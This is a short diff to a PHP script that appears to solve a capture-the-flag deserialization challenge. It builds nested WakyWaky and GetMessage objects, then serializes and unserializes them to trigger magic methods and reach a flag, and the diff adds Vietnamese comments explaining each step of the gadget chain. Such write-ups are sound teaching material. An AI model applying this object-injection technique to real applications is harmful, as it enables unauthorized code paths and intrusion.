@@ -43,16 +43,18 @@ class WakyWaky {
     }
 }
 
+// Mục tiêu: gọi __toString ở class WakyWaky để $getflag = true; rồi tạo object getMessage mà không trigger điều kiện block ở construct
+
 $mess = new GetMessage('a');
-$mess->receive = 'HelloBooooooy';
+$mess->receive = 'HelloBooooooy'; // thỏa mãn điều kiện lấy flag ở __destruct()
 
 $pad_wak = new WakyWaky();
-$pad_wak->msg = $mess;
+$pad_wak->msg = $mess; // gán recieve property của obj này là 1 object GetMessage khác rồi gọi nó
 
 $wak = new WakyWaky();
-$wak->msg = $pad_wak;
+$wak->msg = $pad_wak; // gọi toString ở WakyWaky
 
-$a = serialize($wak);
+$a = serialize($wak); // gọi __wakeUp()
 echo $a . "\n\n";
 
 unserialize($a);
